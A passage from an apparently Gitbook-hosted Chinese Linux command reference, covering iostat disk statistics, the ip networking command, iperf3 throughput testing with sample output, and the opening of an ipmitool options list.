iostat还有一个比较常用的选项-x，该选项将用于显示和io相关的扩展数据。 iostat -d -x -k 1 10 Device: rrqm/s wrqm/s r/s w/s rsec/s wsec/s rkB/s wkB/s avgrq-sz avgqu-sz await svctm %util sda 1.56 28.31 7.80 31.49 42.51 2.92 21.26 1.46 1.16 0.03 0.79 2.62 10.28 Device: rrqm/s wrqm/s r/s w/s rsec/s wsec/s rkB/s wkB/s avgrq-sz avgqu-sz await svctm %util sda 2.00 20.00 381.00 7.00 12320.00 216.00 6160.00 108.00 32.31 1.75 4.50 2.17 84.20 输出信息的含义 rrqm/s：每秒这个设备相关的读取请求有多少被Merge了（当系统调用需要读取数据的时候，VFS将请求发到各个FS，如果FS发现不同的读取请求读取的是相同Block的数据，FS会将这个请求合并Merge）；wrqm/s：每秒这个设备相关的写入请求有多少被Merge了。 rsec/s：每秒读取的扇区数； wsec/：每秒写入的扇区数。 rKB/s：The number of read requests that were issued to the device per second； wKB/s：The number of write requests that were issued to the device per second； avgrq-sz 平均请求扇区的大小 avgqu-sz 是平均请求队列的长度。毫无疑问，队列长度越短越好。 await： 每一个IO请求的处理的平均时间（单位是微秒毫秒）。这里可以理解为IO的响应时间，一般地系统IO响应时间应该低于5ms，如果大于10ms就比较大了。 这个时间包括了队列时间和服务时间，也就是说，一般情况下，await大于svctm，它们的差值越小，则说明队列时间越短，反之差值越大，队列时间越长，说明系统出了问题。 svctm 表示平均每次设备I/O操作的服务时间（以毫秒为单位）。如果svctm的值与await很接近，表示几乎没有I/O等待，磁盘性能很好，如果await的值远高于svctm的值，则表示I/O队列等待太长， 系统上运行的应用程序将变慢。 %util： 在统计时间内所有处理IO时间，除以总共统计时间。例如，如果统计间隔1秒，该设备有0.8秒在处理IO，而0.2秒闲置，那么该设备的%util = 0.8/1 = 80%，所以该参数暗示了设备的繁忙程度。一般地，如果该参数是100%表示设备已经接近满负荷运行了（当然如果是多磁盘，即使%util是100%，因为磁盘的并发能力，所以磁盘使用未必就到了瓶颈）。 3.3 -c iostat还可以用来获取cpu部分状态值： iostat -c 1 10 avg-cpu: %user %nice %sys %iowait %idle 1.98 0.00 0.35 11.45 86.22 avg-cpu: %user %nice %sys %iowait %idle 1.62 0.00 0.25 34.46 63.67 4. 示例 iostat -d -k 1 10 #查看TPS和吞吐量信息(磁盘读写速度单位为KB) iostat -d -m 2 #查看TPS和吞吐量信息(磁盘读写速度单位为MB) iostat -d -x -k 1 10 #查看设备使用率（%util）、响应时间（await） iostat -c 1 10 #查看cpu状态 iostat -d -k 1 |grep sda10 Device: tps kB_read/s kB_wrtn/s kB_read kB_wrtn sda10 60.72 18.95 71.53 395637647 1493241908 sda10 299.02 4266.67 129.41 4352 132 sda10 483.84 4589.90 4117.17 4544 4076 sda10 218.00 3360.00 100.00 3360 100 sda10 546.00 8784.00 124.00 8784 124 sda10 827.00 13232.00 136.00 13232 136 上面看到，磁盘每秒传输次数平均约400；每秒磁盘读取约5MB，写入约1MB。 iostat -d -x -k 1 Device: rrqm/s wrqm/s r/s w/s rsec/s wsec/s rkB/s wkB/s avgrq-sz avgqu-sz await svctm %util sda 1.56 28.31 7.84 31.50 43.65 3.16 21.82 1.58 1.19 0.03 0.80 2.61 10.29 sda 1.98 24.75 419.80 6.93 13465.35 253.47 6732.67 126.73 32.15 2.00 4.70 2.00 85.25 sda 3.06 41.84 444.90 54.08 14204.08 2048.98 7102.04 1024.49 32.57 2.10 4.21 1.85 92.24 可以看到磁盘的平均响应时间80。磁盘响应正常，但是已经很繁忙了。 5. 总结 如果 %util 接近 100%，说明产生的I/O请求太多，I/O系统已经满负荷，该磁盘可能存在瓶颈。 idle小于70% IO压力就较大了，一般读取速度有较多的wait。 同时可以结合vmstat 查看查看b参数(等待资源的进程数)和wa参数(IO等待所占用的CPU时间的百分比，高过30%时IO压力高)。 另外 await 的参数也要多和 svctm 来参考。差的过高就一定有 IO 的问题。 avgqu-sz 也是个做 IO 调优时需要注意的地方，这个就是直接每次操作的数据的大小，如果次数多，但数据拿的小的话，其实 IO 也会很小。如果数据拿的大，才IO 的数据会高。也可以通过 avgqu-sz × ( r/s or w/s ) = rsec/s or wsec/s。也就是讲，读定速度是这个来决定的。 svctm 一般要小于 await (因为同时等待的请求的等待时间被重复计算了)，svctm 的大小一般和磁盘性能有关，CPU/内存的负荷也会对其有影响，请求过多也会间接导致 svctm 的增加。await 的大小一般取决于服务时间(svctm) 以及 I/O 队列的长度和 I/O 请求的发出模式。如果 svctm 比较接近 await，说明 I/O 几乎没有等待时间；如果 await 远大于 svctm，说明 I/O 队列太长，应用得到的响应时间变慢，如果响应时间超过了用户可以容许的范围，这时可以考虑更换更快的磁盘，调整内核 elevator 算法，优化应用，或者升级 CPU。 参考： sparkdev linux iostat 命令 iostat 监视I/O子系统 iostat(1) — Linux manual page Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 14:57:04 "},"Linux-Command/Linux_Command_ip.html":{"url":"Linux-Command/Linux_Command_ip.html","title":"Linux Command Ip","keywords":"","body":"Linux Command ip1. ip2. ip link3. ip address4. ip route5. ip netns6. 更多ip相关命令Linux Command ip tagsstart 网络 tagsstop 1. ip $ ip [option] [动作] [命令]** 参数： option ：设定的参数，主要有： -s ：显示出该设备的统计数据(statistics)，例如总接受封包数等； 动作：就是是可以针对哪些网络参数进行动作，包括有： link ：关于设备 (device) 的相关设定，包括 MTU, MAC 地址等等 addr/address ：关于额外的 IP 设定，例如多 IP 的实现等等； route ：与路由有关的相关设定 2. ip link 关于设备(device) 的相关设定： ip link ip link 可以设定与设备 (device) 有关的相关设定，包括 MTU 以及该网络设备的 MAC 等等， 当然也可以启动 (up) 或关闭 (down) 某个网络设备。整个语法是这样的： $ ip [-s] link show 参数： show：仅显示出这个设备的相关内容，如果加上 -s 会显示更多统计数据； set ：可以开始设定项目， device 指的是 eth0, eth1 等等设备代号； 动作与参数：包括以下动作： up|down ：启动 (up) 或关闭 (down) 某个设备，其他参数使用预设的以太网参数； address ：如果这个设备可以更改 MAC ，用这个参数修改； name ：给予这个设备一个特殊的名字； mtu ：设置最大传输单元。 $ ip link show $ ip -s link show eth0 ip link set eth0 up$ 启动eth0这个设备 $ ip link set eth0 down $ 关闭eth0这个设备 $ ip link set eth0 mtu 1000 $ 更改 MTU为1000 bytes，单位就是 bytes 使用 ip link show 可以显示出整个设备的硬件相关信息，如上所示，包括 MAC地址、MTU等等， 比较有趣的应该是那个 sit0 的设备了，那个 sit0 的设备是将IPv4 和 IPv6 的封包进行转换， 对于我们仅使用 IPv4 的网络是没有作用的。 lo 及 sit0 都是主机内部自行设定的。 而如果加上 -s 的参数后，则这个网卡的相关统计信息就会被列出来， 包括接收 (RX) 及传送 (TX) 的封包数量等等，详细的内容与 ifconfig 所输出的结果相同。 更新网卡的 MTU 使用 ifconfig 也可以实。如果是要更改『网卡代号、 MAC 地址的信息』的话，那可就得使用 ip了，设定前需要先关闭该网卡，否则会不成功 修改网卡代号、MAC 等参数 $ ip link set eth0 name vbird $不会成功 $ ip link set eth0 down 因为我们的 ifcfg-eth0 还是使用原本的设备代号！避免有问题，要改回来 $ ip link set vbird name eth0 关闭一个网络设备 $ ip link set dev ens33 down$ 等同于ifconfig ens33 down 修改网络设备的MTU $ip link set dev ens33 mtu 1500 3. ip address 关于额外的 IP 相关设定： ip address 如果说 ip link 是与 OSI 七层模型的第二层数据链路层有关的话，那么 ip address (ip addr) 就是与第三层网络层有关的了。主要是在设定与 IP 有关的各项参数，包括 netmask, broadcast 等等。 $ ip address show 参数： show ：单纯的显示出设备的 IP 信息； add|del ：进行相关参数的增加 (add) 或删除 (del) 设定，主要有： IP 参数 ：主要就是网域的设定，例如 192.168.100.100/24 之类的设定； dev ：这个 IP 参数所要设定的设备，例如 eth0, eth1 等等； 相关参数：如下所示： broadcast：设定广播位址，如果设定值是 + 表示让系统自动计算； label ：该设备的别名，例如eth0:0； scope ：这个设备的领域，通常是以下几个大类： global ：允许来自所有来源的连线； site ：仅支持IPv6 ，仅允许本主机的连接； link ：仅允许本设备自我连接； host ：仅允许本主机内部的连接； 所以当然是使用 global 了。预设也是 global ！ $ ip address show $显示出所有设备的 IP 参数 $ ifconfig $ ip address add 192.168.50.50/24 broadcast + > dev eth0 label eth0:vbird 新增一个设备，名称假设为 eth0:vbird $ ip address show eth0 inet 192.168.1.100/24 brd 192.168.1.255 scope global eth0 inet 192.168.50.50/24 brd 192.168.50.255 scope global eth0:vbird 看上面的输出多出了一行，增加了新的设备，名称是 eth0:vbird # 至于那个 broadcast + 也可以写成 broadcast 192.168.50.255 $ ip address del 192.168.50.50/24 dev eth0 $将刚刚的设备删除 4. ip route 这个项目就是路由的查看与设定。事实上ip route 的功能几乎与 route 这个命令一样，但是，它还可以进行额外的参数设置，例如 MTU 的规划等等，相当的强悍啊！ $ ip route show 参数： show ：单纯的显示出路由表，也可以使用 list ； add|del ：增加 (add) 或删除 (del) 路由； IP或网域：可使用 192.168.50.0/24 之类的网域或者是单纯的 IP ； via：从那个 gateway 出去，不一定需要； dev：由那个设备连出去，需要； mtu：可以额外的设定 MTU 的数值； $ ip route show $显示出目前的路由资料 192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.2 169.254.0.0/16 dev eth1 scope link default via 192.168.1.254 dev eth1 - proto：此路由的路由协定，主要有 redirect, kernel, boot, static, ra 等， 其中 kernel指的是直接由核心判断自动设定。 - scope：路由的范围，主要是 link ，是与本设备有关的直接连接。 增加路由，主要是本机直接可沟通的网域 $ ip route add 192.168.5.0/24 dev eth0 # 针对本机直接沟通的网域设定好路由，不需要透过外部的路由器 $ ip route show 192.168.5.0/24 dev eth0 scope link 增加可以通往外部的路由，需透过 router ； $ ip route add 192.168.10.0/24 via 192.168.5.100 dev eth0 $ ip route show 192.168.5.0/24 dev eth0 scope link。。。。。 192.168.10.0/24 via 192.168.5.100 dev eth0 增加预设路由 $ ip route add default via 192.168.1.2 dev eth0 # 那个 192.168.1.2 就是我的预设路由器(gateway) 删除路由 $ ip route del 192.168.10.0/24 $ ip route del 192.168.5.0/24 5. ip netns 1.增加虚拟网络命名空间 $ ip netns add net0 2.显示所有的虚拟网络命名空间 # ip netns list net0 也可通过查看/var/run/netns目录下的文件来list EULER:~$ ls /var/run/netns/ net0 3.进入虚拟机网络环境 ip netns exec net0 `command` 如 $ ip netns exec net0 bash $打开虚拟网络环境net0的bash窗口 $ ip addr$显示所有虚拟网络环境的设备 $ exit$退出该网络虚拟环境 exit 4.增加一对veth虚拟网卡 $ ip link add type veth 5.将veth0添加到net0虚拟网络环境 ip link set veth0 netns net0 6.将虚拟网卡veth1改名并添加到net1虚拟网络环境中 ip link set dev veth1 name net1-bridge netns net1 7.设置虚拟网络环境net0的veth0设备处于激活状态 ip netns exec net0 ip link set veth0 up 8.为虚拟网络环境net0的veth0设备增加IP地址 ip netns exec net0 ip address add 10.0.1.1/24 dev veth0 ip link set br0 netns ns1$将br0添加到ns1虚拟网络环境 ethtool -k br0 $查看设备转移 ip netns exec netns1 ethtool -S veth1 $查询veth设备对端口在设备列表中的序列号 ip r ip l ip -6 a IP 命令[3] 类似于 ifconfig，常用于配置静态 IP 地址、路由 & 默认网关，等等。 ifconfig 命令因为多年没有维护而被遗弃了，即使它仍然在大多数 Linux 发行版上可获得。 ifconfig 命令已经被 ip 命令替代了，ip 命令是非常强大的，只要一个命令就能执行几个网络管理任务。 ip 命令工具附带在 iproute2 包中。在主要的 Linux 发行版中都默认预装了 iproute2 。 如果没有，你可以在你的终端中在包管理器的帮助下通过指定 iproute2 来安装它。 $ ip r 或 $ ip route 或 $ ip route show default via 192.168.1.1 dev wlp8s0 proto dhcp metric 600 192.168.1.0/24 dev wlp8s0 proto kernel scope link src 192.168.1.6 metric 600 6. 更多ip相关命令 ip ip6tables ip6tables-restore ip6tables-save ipcalc ipcmk ipcrm ipcs ipmaddr iprconfig iprdbg iprdump iprinit iprsos iprupdate ipset iptables iptables-restore iptables-save 参考： How to find your IP address in Linux Ways to Find IP address in Linux Linux ip Command Examples Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 15:32:22 "},"Linux-Command/Linux_Command_iperf3.html":{"url":"Linux-Command/Linux_Command_iperf3.html","title":"Linux Command Iperf 3","keywords":"","body":"Linux Command iperf3网络测速工具1. 简介2. 安装3. 功能4. 参数5. 示例5.1 测试TCP吞吐量5.2 测试UDP吞吐量Linux Command iperf3网络测速工具 tagsstart 网络 测试 tagsstop 1. 简介 Iperf是一款基于TCP/IP和UDP/IP的网络性能测试工具，可以用来测量网络带宽和网络质量，提供网络延迟抖动、数据包丢失率、最大传输单元等统计信息。网络管理员可以根据这些信息了解并判断网络性能问题，从而定位网络瓶颈，解决网络故障。 Iperf 是一款基于命令行模式的网络性能测试工具，是跨平台的，提供横跨Windows、Linux、Mac的全平台支持。iperf 全程使用内存作为发送/接收缓冲区，不受磁盘性能的影响，对于机器配置要求很低。不过由于是命令行工具， iperf 不支持输出测试图形。 Iperf可以测试TCP和UDP带宽质量，具有多种参数和UDP特性，可以用来测试一些网络设备如路由器，防火墙，交换机等的性能 2. 安装 iperf3安装iperf3下载：https://iperf.fr/iperf-download.php#fedora [root@xiexianbin-cn ~]# rpm -ivh iperf3-3.1.3-1.fc24.x86_64.rpm Preparing... ################################# [100%] Updating / installing... 1:iperf3-3.1.3-1.fc24 ################################# [100%] 3. 功能 （1）TCP方面 ① 测量网络带宽 ② 报告MSS/MTU值的大小和观测值 ③ 支持TCP窗口值通过套接字缓冲 ④ 当P线程或Win32线程可用时，支持多线程。客户端与服务端支持同时多重连接 （2）UDP方面 ① 客户端可以创建指定带宽的UDP流 ② 测量丢包 ③ 测量延迟 ④ 支持多播 ⑤ 当P线程可用时，支持多线程。客户端与服务端支持同时多重连接（不支持Windows） （3）其他方面 ① 在适当的地方，选项中可以使用K（kilo-）和M（mega-）。例如131072字节可以用128K代替。 ② 可以指定运行的总时间，甚至可以设置传输的数据总量。 ③ 在报告中，为数据选用最合适的单位。 ④ 服务器支持多重连接，而不是等待一个单线程测试。 ⑤ 在指定时间间隔重复显示网络带宽，波动和丢包情况。 ⑥ 服务器端可作为后台程序运行。 ⑦ 服务器端可作为Windows 服务运行。 ⑧ 使用典型数据流来测试链接层压缩对于可用带宽的影响。 4. 参数 4.1通用参数（Server端和Client端共用） （1）-f，–farmat [k|m|g|K|M|G]：指定带宽输出单位，“[k|m|g|K|M|G]”分别表示以Kbits, Mbits, Gbits, KBytes, MBytes,GBytes显示输出结果，默认Mbits，eg：iperf3 -c 192.168.12.168 -f M （2）-p，–port：指定服务器端监听的端口或客户端所连接的端口，默认是5001端口。 （3）-i，–interval：指定每次报告之间的时间间隔，单位为秒，eg：iperf3 -c 192.168.12.168 -i 2 （4）-F：指定文件作为数据流进行带宽测试。例如：iperf3 -c 192.168.12.168 -F web-ixdba.tar.gz 4.2、Server端专用参数 （1）-s,–server：iperf服务器模式，默认启动的监听端口为5201，eg：iperf -s （2）-c,–client host：如果iperf运行在服务器模式，并且用-c参数指定一个主机，那么iperf将只接受指定主机的连接。此参数不能工作于UDP模式。 （3）-D：Unix平台下将Iperf作为后台守护进程运行。在Win32平台下，Iperf将作为服务运行。 （4）-R：卸载Iperf服务(仅用于Windows)。 （5）-o：重定向输出到指定文件(仅用于Windows)。 （6）-P,–parallel：服务器关闭之前保持的连接数。默认是0，这意味着永远接受连接。 4.3 Client端专用参数 （ 1）-c,–client host：iperf客户端模式，host是server端地址，eg：iperf -c 222.35.11.23 （2）-u，–udp：表示采用UDP协议发送报文，不带该参数表示采用TCP协议。 （3）-b，–bandwidth [K|M|G]：指定UDP模式使用的带宽，单位bits/sec，默认值是1 Mbit/sec。 （4）-t，–time：指定数据传输的总时间，即在指定的时间内，重复发送指定长度的数据包。默认10秒。 （5）-l，–len：设置读写缓冲区的长度，单位为 Byte。TCP默认为8KB，UDP默认为1470字节。通常测试 PPS 的时候该值为16，测试BPS时该值为1400。 （6）-n，–num [K|M|G]：指定传输数据包的字节数，例如：iperf3 -c 192.168.12.168 –n 100M （7）-P,–parallel：指定客户端与服务端之间使用的线程数。默认是1个线程。需要客户端与服务器端同时使用此参数。 （8）-w，–window：指定套接字缓冲区大小，在TCP方式下，此设置为TCP窗口的大小。在UDP方式下，此设置为接受UDP数据包的缓冲区大小，用来限制可以接收数据包的最大值 （9）-B，–bind：用来绑定一个主机地址或接口，这个参数仅用于具有多个网络接口的主机。在UDP模式下，此参数用于绑定和加入一个多播组。 （10）-M，–mss：设置TCP最大信息段的值 （11）-N，–nodelay：设置TCP无延时 （12）-V：绑定一个IPv6地址。 （13）-d，–dualtest：运行双测试模式。将使服务器端反向连接到客户端，使用-L参数中指定的端口（或默认使用客户端连接到服务器端的端口）。使用参数-r以运行交互模式。 （14）-L,–listenport：指定服务端反向连接到客户端时使用的端口。默认使用客户端连接至服务端的端口。 （15）-r，–tradeoff：往复测试模式。当客户端到服务器端的测试结束时，服务器端反向连接至客户端。当客户端连接终止时，反向连接随即开始。如果需要同时进行双向测试，请尝试-d参数。 4.4 其他参数 （1）-h，–help：显示命令行参考并退出。 [root]# iperf3 -h Usage: iperf3 [-s|-c host] [options] iperf3 [-h|--help] [-v|--version] （2）-v，–version：显示版本信息和编译信息并退出。 5. 示例 环境准备： （1）Server端IP地址：192.168.211.40 （2）Server端IP地址：192.168.211.41 5.1 测试TCP吞吐量 Server端开启iperf的服务器模式，指定TCP端口： root@master:~# iperf3 -s -i 1 -p 5201 ----------------------------------------------------------- Server listening on 5201 ----------------------------------------------------------- Client端启动iperf的客户端模式，连接服务端 root@node1:~# iperf3 -c 192.168.211.40 -i 1 -t 60 -p 5201 Connecting to host 192.168.211.40, port 5201 [ 4] local 192.168.211.41 port 50818 connected to 192.168.211.40 port 5201 [ ID] Interval Transfer Bandwidth Retr Cwnd [ 4] 0.00-1.00 sec 176 MBytes 1.47 Gbits/sec 89 1.49 MBytes [ 4] 1.00-2.01 sec 135 MBytes 1.13 Gbits/sec 0 1.63 MBytes [ 4] 2.01-3.00 sec 160 MBytes 1.35 Gbits/sec 0 1.73 MBytes [ 4] 3.00-4.00 sec 172 MBytes 1.44 Gbits/sec 15 1.28 MBytes [ 4] 4.00-5.00 sec 154 MBytes 1.29 Gbits/sec 0 1.36 MBytes [ 4] 5.00-6.00 sec 162 MBytes 1.36 Gbits/sec 0 1.43 MBytes [ 4] 6.00-7.01 sec 164 MBytes 1.37 Gbits/sec 0 1.49 MBytes Server端监听结果 root@master:~# iperf3 -s -i 1 -p 5201 ----------------------------------------------------------- Server listening on 5201 ----------------------------------------------------------- Accepted connection from 192.168.211.41, port 50816 [ 5] local 192.168.211.40 port 5201 connected to 192.168.211.41 port 50818 [ ID] Interval Transfer Bandwidth [ 5] 0.00-1.00 sec 168 MBytes 1.41 Gbits/sec [ 5] 1.00-2.00 sec 136 MBytes 1.14 Gbits/sec [ 5] 2.00-3.00 sec 158 MBytes 1.33 Gbits/sec [ 5] 3.00-4.00 sec 174 MBytes 1.46 Gbits/sec [ 5] 4.00-5.01 sec 154 MBytes 1.28 Gbits/sec 参数说明： ① Interval表示时间间隔。 ② Transfer表示时间间隔里面转输的数据量。 ③ Bandwidth是时间间隔里的传输速率。 执行20秒，每5秒执行一次 root@node1:~# iperf3 -c 192.168.211.40 -t 20 -i 5 Connecting to host 192.168.211.40, port 5201 [ 4] local 192.168.211.41 port 51392 connected to 192.168.211.40 port 5201 [ ID] Interval Transfer Bandwidth Retr Cwnd [ 4] 0.00-5.00 sec 700 MBytes 1.17 Gbits/sec 75 1.32 MBytes [ 4] 5.00-10.00 sec 738 MBytes 1.24 Gbits/sec 0 1.59 MBytes [ 4] 10.00-15.00 sec 729 MBytes 1.22 Gbits/sec 17 1.47 MBytes [ 4] 15.00-20.00 sec 834 MBytes 1.40 Gbits/sec 249 1.25 MBytes - - - - - - - - - - - - - - - - - - - - - - - - - [ ID] Interval Transfer Bandwidth Retr [ 4] 0.00-20.00 sec 2.93 GBytes 1.26 Gbits/sec 341 sender [ 4] 0.00-20.00 sec 2.93 GBytes 1.26 Gbits/sec receiver iperf Done. 传输数据包5G，每10秒显示一次 root@node1:~# iperf3 -c 192.168.211.40 -i 10 -n 5G Connecting to host 192.168.211.40, port 5201 [ 4] local 192.168.211.41 port 51786 connected to 192.168.211.40 port 5201 [ ID] Interval Transfer Bandwidth Retr Cwnd [ 4] 0.00-10.00 sec 988 MBytes 829 Mbits/sec 301 1.49 MBytes [ 4] 10.00-20.00 sec 1.23 GBytes 1.06 Gbits/sec 18 1.65 MBytes [ 4] 20.00-30.00 sec 1.39 GBytes 1.20 Gbits/sec 1 1.63 MBytes [ 4] 30.00-40.00 sec 989 MBytes 829 Mbits/sec 18 1.74 MBytes [ 4] 40.00-45.88 sec 459 MBytes 655 Mbits/sec 7 1.47 MBytes - - - - - - - - - - - - - - - - - - - - - - - - - [ ID] Interval Transfer Bandwidth Retr [ 4] 0.00-45.88 sec 5.00 GBytes 936 Mbits/sec 345 sender [ 4] 0.00-45.88 sec 5.00 GBytes 936 Mbits/sec receiver iperf Done. -F指定文件，传输 root@node1:~# iperf3 -c 192.168.211.40 -i 2 -F hello-world.tar -t 20 Connecting to host 192.168.211.40, port 5201 [ 4] local 192.168.211.41 port 52192 connected to 192.168.211.40 port 5201 [ ID] Interval Transfer Bandwidth Retr Cwnd [ 4] 0.00-2.00 sec 187 MBytes 785 Mbits/sec 63 1.36 MBytes [ 4] 2.00-3.29 sec 105 MBytes 684 Mbits/sec 0 1.53 MBytes - - - - - - - - - - - - - - - - - - - - - - - - - [ ID] Interval Transfer Bandwidth Retr [ 4] 0.00-3.29 sec 292 MBytes 746 Mbits/sec 63 sender Sent 292 MByte / 293 MByte (99%) of hello-world.tar [ 4] 0.00-3.29 sec 290 MBytes 741 Mbits/sec receiver iperf Done. “-P”参数开启了2个多线程 root@node1:~# iperf3 -c 192.168.211.40 -i 2 -P 2 -F hello-world.tar -t 20 Connecting to host 192.168.211.40, port 5201 [ 4] local 192.168.211.41 port 52368 connected to 192.168.211.40 port 5201 [ 7] local 192.168.211.41 port 52370 connected to 192.168.211.40 port 5201 [ ID] Interval Transfer Bandwidth Retr Cwnd [ 4] 0.00-2.00 sec 139 MBytes 583 Mbits/sec 41 650 KBytes [ 7] 0.00-2.00 sec 174 MBytes 731 Mbits/sec 108 1.02 MBytes [SUM] 0.00-2.00 sec 314 MBytes 1.31 Gbits/sec 149 - - - - - - - - - - - - - - - - - - - - - - - - - [ 4] 2.00-3.64 sec 81.7 MBytes 417 Mbits/sec 0 731 KBytes [ 7] 2.00-3.64 sec 112 MBytes 574 Mbits/sec 16 666 KBytes [SUM] 2.00-3.64 sec 194 MBytes 991 Mbits/sec 16 - - - - - - - - - - - - - - - - - - - - - - - - - [ ID] Interval Transfer Bandwidth Retr [ 4] 0.00-3.64 sec 221 MBytes 508 Mbits/sec 41 sender Sent 221 MByte / 293 MByte (75%) of hello-world.tar [ 4] 0.00-3.64 sec 218 MBytes 502 Mbits/sec receiver [ 7] 0.00-3.64 sec 287 MBytes 660 Mbits/sec 124 sender Sent 287 MByte / 293 MByte (97%) of hello-world.tar [ 7] 0.00-3.64 sec 285 MBytes 655 Mbits/sec receiver [SUM] 0.00-3.64 sec 508 MBytes 1.17 Gbits/sec 165 sender [SUM] 0.00-3.64 sec 503 MBytes 1.16 Gbits/sec receiver iperf Done. 5.2 测试UDP吞吐量 带宽测试通常采用UDP模式，因为能测出极限带宽、时延抖动、丢包率。在进行测试时，首先以链路理论带宽作为数据发送速率进行测试，例如，从客户端到服务器之间的链路的理论带宽为100Mbps，先用-b 100M进行测试，然后根据测试结果（包括实际带宽，时延抖动和丢包率），再以实际带宽作为数据发送速率进行测试，会发现时延抖动和丢包率比第一次好很多，重复测试几次，就能得出稳定的实际带宽。 root@node1:~# iperf3 -u -c 192.168.211.40 -b 100m -t 5 -p 5201 Connecting to host 192.168.211.40, port 5201 [ 4] local 192.168.211.41 port 56642 connected to 192.168.211.40 port 5201 [ ID] Interval Transfer Bandwidth Total Datagrams [ 4] 0.00-1.00 sec 11.2 MBytes 94.2 Mbits/sec 1439 [ 4] 1.00-2.00 sec 12.2 MBytes 103 Mbits/sec 1564 [ 4] 2.00-3.00 sec 11.7 MBytes 97.9 Mbits/sec 1498 [ 4] 3.00-4.00 sec 11.7 MBytes 98.5 Mbits/sec 1499 [ 4] 4.00-5.00 sec 11.8 MBytes 98.9 Mbits/sec 1514 - - - - - - - - - - - - - - - - - - - - - - - - - [ ID] Interval Transfer Bandwidth Jitter Lost/Total Datagrams [ 4] 0.00-5.00 sec 58.7 MBytes 98.4 Mbits/sec 0.283 ms 260/7514 (3.5%) [ 4] Sent 7514 datagrams iperf Done. 进行上下行带宽测试（双向传输） root@node1:~# iperf3 -u -c 192.168.211.40 -b 100M -d -t 5 send_parameters: { \"udp\": true, \"omit\": 0, \"time\": 5, \"parallel\": 1, \"len\": 8192, \"bandwidth\": 100000000, \"client_version\": \"3.1.3\" } Connecting to host 192.168.211.40, port 5201 Setting fair-queue socket pacing to 12500000 [ 4] local 192.168.211.41 port 35492 connected to 192.168.211.40 port 5201 [ ID] Interval Transfer Bandwidth Total Datagrams [ 4] 0.00-1.00 sec 11.1 MBytes 92.6 Mbits/sec 1415 [ 4] 1.00-2.00 sec 11.7 MBytes 98.4 Mbits/sec 1501 [ 4] 2.00-3.00 sec 12.5 MBytes 105 Mbits/sec 1604 [ 4] 3.00-4.00 sec 11.9 MBytes 100 Mbits/sec 1529 send_results { \"cpu_util_total\": 33.363549, \"cpu_util_user\": 0.629773, \"cpu_util_system\": 32.748183, \"sender_has_retransmits\": 0, \"streams\": [{ \"id\": 1, \"bytes\": 62136320, \"retransmits\": -1, \"jitter\": 0, \"errors\": 0, \"packets\": 7585 }] } get_results { \"cpu_util_total\": 7.860842, \"cpu_util_user\": 0.309339, \"cpu_util_system\": 7.578802, \"sender_has_retransmits\": -1, \"streams\": [{ \"id\": 1, \"bytes\": 58638336, \"retransmits\": -1, \"jitter\": 0.000264, \"errors\": 427, \"packets\": 7585 }] } [ 4] 4.00-5.00 sec 12.0 MBytes 101 Mbits/sec 1536 - - - - - - - - - - - - - - - - - - - - - - - - - [ ID] Interval Transfer Bandwidth Jitter Lost/Total Datagrams [ 4] 0.00-5.00 sec 59.3 MBytes 99.4 Mbits/sec 0.264 ms 427/7585 (5.6%) [ 4] Sent 7585 datagrams iperf Done. 更多阅读： How to Test Network Throughput Using iperf3 Tool in Linux iperf3 下载 How To Test Network Throughput Using Iperf3 Tool How to Use Iperf to Test Network Performance in Linux Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:17:02 "},"Linux-Command/Linux_Command_ipmitool.html":{"url":"Linux-Command/Linux_Command_ipmitool.html","title":"Linux Command Ipmitool","keywords":"","body":"Linux Command ipmitool1. 简介2. 参数3. 开关机，重启4. 用户管理5. IP网络设置6. SOL功能7. SEL日志查看8. FRU信息查9. SDR，Sensor信息查看10. mc(管理单元BMC)状态和控制11. 设置BMC的iptables防火墙12. 详细命令开启电源关闭电源重启电源查看电源状态设置为BIOS启动设置为pxe启动设置为光盘启动设置为硬盘启动重启BMC修改BMC密码远程文本重定向 重启服务器就能看到画面当有这个错误时 Info: SOL payload already active on another session获取mac地址 有些机型不准 我这个是dell的服务器 华为服务器也可以使用Linux Command ipmitool tagsstart 设备管理 tagsstop 1. 简介 IPMI（Intelligent Platform Management Interface）即智能平台管理接口是使硬件管理具备“智能化”的新一代通用接口标准。用户可以利用 IPMI 监视服务器的物理特征，如温度、电压、电扇工作状态、电源供应以及机箱入侵等。Ipmi 最大的优势在于它是独立于 CPU BIOS 和 OS 的，所以用户无论在开机还是关机的状态下，只要接通电源就可以实现对服务器的监控。Ipmi 是一种规范的标准，其中最重要的物理部件就是BMC(Baseboard Management Controller 如图1)，一种嵌入式管理微控制器，它相当于整个平台管理的“大脑”，通过它 ipmi 可以监控各个传感器的数据并记录各种事件的日志。 ipmitool 是一种可用在 linux 系统下的命令行方式的 ipmi 平台管理工具，它支持 ipmi 1.5 规范（最新的规范为 ipmi 2.0），通过它可以实现获取传感器的信息、显示系统日志内容、网络远程开关机等功能。Ipmitool 有两种使用方式 2. 参数 Options(选项) -a 提示输入远程服务器的密码 -A 当IPMIv1.5会话激活时，指定使用一个认证类型。 -c 使输出格式为 CSV(逗号分隔的变量)格式。但是不是针对所有命令都有效。 -C 为IPMIv2 lanplus连接使用远程服务器身份验证、完整性和加密算法。请看IPMIv2说明书中的表格 22-19。默认的三个格式为：指定RAKP-HMAC-SHA1为验证，HMAC-SHA1-96为完整性，AES-CBC-128为加密算法。 -E 远程服务密码通过环境变量IPMI_PASSWORD来指定。 -f 指定一个文件，而这个文件中包含了远程服务密码。如果这个选项没有被使用，或者指定的文件不存在，那么那么密码将默认为NULL。 -h 获取基本帮助 -H 远程服务地址，可以为ip地址或者是主机名。Lan和lanplus接口都需要这个操作。 -I 选择使用的IPMI接口。编译支持的接口都在使用帮助输出中可见 -L 力量会话特权级别。可以为CALLBACK,USER, OPERATOR, ADMIN。默认为ADMIN。 -m 设置本地IPMB（智能平台管理总线）地址。默认的为0x20。如果是一般的操作，那么就没有必要更改它。 -o 选择支持的OEM（原始设备制造商）类型。这通常涉及到代码中的小窍门，以解决各种BMC在不同制造商的怪癖到位。使用命令“-o list”来查看当前支持的OEM类型的列表。 -p 设置要连接的远程服务UPD端口，默认为623。 -P 在命令行中指定远程服务密码。如果支持，他将会进程列表中被掩盖。注意！：不推荐在命令行中指定密码。 -t 